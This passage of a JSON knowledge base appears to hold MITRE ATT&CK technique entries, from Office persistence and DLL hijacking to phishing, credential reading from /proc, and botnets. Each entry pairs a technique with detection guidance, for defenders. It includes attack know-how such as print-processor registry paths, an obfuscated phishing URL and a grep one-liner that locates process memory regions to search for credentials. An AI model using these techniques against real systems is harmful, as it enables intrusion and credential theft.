      "description": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1137",
      "stix_id": "attack-pattern--2c4d4e92-0ccf-4a97-b54c-86d662988a53",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-15T22:54:32.990000+00:00",
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Application Log: Application Log Content",
        "Windows Registry: Windows Registry Key Modification",
        "File: File Modification",
        "Module: Module Load",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.\n\nMany Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page)\n\nMicrosoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)"
    },
    "T1218.004": {
      "id": "T1218.004",
      "name": "InstallUtil",
      "description": "Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.\n\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.004",
      "stix_id": "attack-pattern--2cd950a6-16c4-404a-aa01-044322395107",
      "created": "2020-01-23T19:09:48.811000+00:00",
      "modified": "2025-04-25T14:46:11.581000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed."
    },
    "T1598.003": {
      "id": "T1598.003",
      "name": "Spearphishing Link",
      "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1598.003",
      "stix_id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
      "created": "2020-10-02T17:09:50.723000+00:00",
      "modified": "2025-04-15T23:10:59.931000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nMonitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites."
    },
    "T1021.004": {
      "id": "T1021.004",
      "name": "SSH",
      "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. On ESXi, SSH can be enabled either directly on the host (e.g., via `vim-cmd hostsvc/enable_ssh`) or via vCenter.(Citation: Sygnia ESXi Ransomware 2025)(Citation: TrendMicro ESXI Ransomware)(Citation: Sygnia Abyss Locker 2025) The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user (i.e., [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1021.004",
      "stix_id": "attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6",
      "created": "2020-02-11T18:27:15.774000+00:00",
      "modified": "2025-04-15T19:58:17.607000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Process: Process Creation",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Use of SSH may be legitimate depending on the environment and how it\u2019s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\n\nOn macOS systems <code>log show --predicate 'process = \"sshd\"'</code> can be used to review incoming SSH connection attempts for suspicious activity. The command <code>log show --info --predicate 'process = \"ssh\" or eventMessage contains \"ssh\"'</code> can be used to review outgoing SSH connection activity.(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nOn Linux systems SSH activity can be found in the logs located in <code>/var/log/auth.log</code> or <code>/var/log/secure</code> depending on the distro you are using."
    },
    "T1098.003": {
      "id": "T1098.003",
      "name": "Additional Cloud Roles",
      "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1098.003",
      "stix_id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
      "created": "2020-01-19T16:59:45.362000+00:00",
      "modified": "2025-04-15T21:46:09.054000+00:00",
      "platforms": [
        "IaaS",
        "SaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Modification"
      ],
      "defense_bypassed": [],
      "detection": "Collect activity logs from IAM services and cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins. "
    },
    "T1547.012": {
      "id": "T1547.012",
      "name": "Print Processors",
      "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.012",
      "stix_id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
      "created": "2020-10-05T13:24:49.780000+00:00",
      "modified": "2025-04-15T19:58:17.860000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "File: File Creation",
        "Driver: Driver Load",
        "Module: Module Load",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor process API calls to <code>AddPrintProcessor</code> and <code>GetPrintProcessorDirectory</code>. New print processor DLLs are written to the print processor directory. Also monitor Registry writes to <code>HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\\\[Windows architecture]\\Print Processors\\\\[user defined]\\\\Driver</code> or <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\\\[Windows architecture]\\Print Processors\\\\[user defined]\\Driver</code> as they pertain to print processor installations.\n\nMonitor for abnormal DLLs that are loaded by spoolsv.exe. Print processors that do not correlate with known good software or patching may be suspicious."
    },
    "T1566.001": {
      "id": "T1566.001",
      "name": "Spearphishing Attachment",
      "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1566.001",
      "stix_id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
      "created": "2020-03-02T19:05:18.137000+00:00",
      "modified": "2025-04-15T23:10:26.686000+00:00",
      "platforms": [
        "macOS",
        "Windows",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow",
        "Application Log: Application Log Content",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.\n\nMonitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)"
    },
    "T1027.008": {
      "id": "T1027.008",
      "name": "Stripped Payloads",
      "description": "Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system\u2019s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.(Citation: Mandiant golang stripped binaries explanation)(Citation: intezer stripped binaries elf files 2018)\n\nAdversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002), to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.(Citation: SentinelLabs reversing run-only applescripts 2021)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.008",
      "stix_id": "attack-pattern--2f41939b-54c3-41d6-8f8b-35f1ec18ed97",
      "created": "2022-09-29T18:30:12.244000+00:00",
      "modified": "2025-04-15T19:58:18.337000+00:00",
      "platforms": [
        "macOS",
        "Linux",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1559.001": {
      "id": "T1559.001",
      "name": "Component Object Model",
      "description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1559.001",
      "stix_id": "attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64",
      "created": "2020-02-12T14:09:53.107000+00:00",
      "modified": "2025-04-25T14:46:14.161000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "Script: Script Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)\n\nMonitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on. "
    },
    "T1574.001": {
      "id": "T1574.001",
      "name": "DLL",
      "description": "Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)\n\nSpecific ways DLLs are abused by adversaries include:\n\n### DLL Sideloading\nAdversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).\n\nSide-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.\n\nAdversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)\n\n### DLL Search Order Hijacking\nAdversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)\n\n### DLL Redirection\nAdversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)\n\n### Phantom DLL Hijacking\nAdversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)\n\n### DLL Substitution\nAdversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)\n\nPrograms that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.\n\nRemote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)\n\nIf a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574.001",
      "stix_id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
      "created": "2020-03-13T18:11:08.357000+00:00",
      "modified": "2025-04-16T18:24:47.533000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Process: Process Creation",
        "Module: Module Load",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of `.manifest` and `.local` redirection files that do not correlate with software updates are suspicious."
    },
    "T1119": {
      "id": "T1119",
      "name": "Automated Collection",
      "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1119",
      "stix_id": "attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619",
      "created": "2017-05-31T21:31:27.985000+00:00",
      "modified": "2025-04-15T19:58:18.743000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "IaaS",
        "SaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Authentication",
        "Command: Command Execution",
        "File: File Access",
        "Script: Script Execution"
      ],
      "defense_bypassed": [],
      "detection": "Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [Data Staged](https://attack.mitre.org/techniques/T1074). As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), as well as through cloud APIs and command line interfaces."
    },
    "T1115": {
      "id": "T1115",
      "name": "Clipboard Data",
      "description": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation: MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation: mining_ruby_reversinglabs)\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1115",
      "stix_id": "attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f",
      "created": "2017-05-31T21:31:25.967000+00:00",
      "modified": "2025-04-15T21:57:50.289000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Access to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity."
    },
    "T1003.007": {
      "id": "T1003.007",
      "name": "Proc Filesystem",
      "description": "Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process\u2019s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process\u2019s virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)\n\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes.(Citation: atomic-red proc file system) When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process\u2019s memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook)\n\nIf running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1003.007",
      "stix_id": "attack-pattern--3120b9fa-23b8-4500-ae73-09494f607b7d",
      "created": "2020-02-11T18:46:24.434000+00:00",
      "modified": "2025-04-15T22:57:59.661000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "To obtain the passwords and hashes stored in memory, processes must open a maps file in the `/proc` filesystem for the process being analyzed. This file is stored under the path `/proc/PID/maps`, where the `PID` directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs."
    },
    "T1583.005": {
      "id": "T1583.005",
      "name": "Botnet",
      "description": "Adversaries may buy, lease, or rent a network of compromised systems\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. \n\nInternet-facing edge devices and related network appliances that are end-of-life (EOL) and unsupported by their manufacturers are commonly acquired for botnet activities. Adversaries may lease operational relay box (ORB) networks \u2013 consisting of virtual private servers (VPS), small office/home office (SOHO) routers, or Internet of Things (IoT) devices \u2013 to serve as a botnet.(Citation: ORB Mandiant) \n\nWith a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter) Acquired botnets may also be used to support Command and Control activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) network.\n\n",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1583.005",
      "stix_id": "attack-pattern--31225cd3-cd46-4575-b287-c2c14011c074",
      "created": "2020-10-01T00:49:05.467000+00:00",
      "modified": "2025-04-16T13:29:34.161000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during [Phishing](https://attack.mitre.org/techniques/T1566), [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499), or [Network Denial of Service](https://attack.mitre.org/techniques/T1498)."
    },
    "T1555.005": {
      "id": "T1555.005",
      "name": "Password Managers",
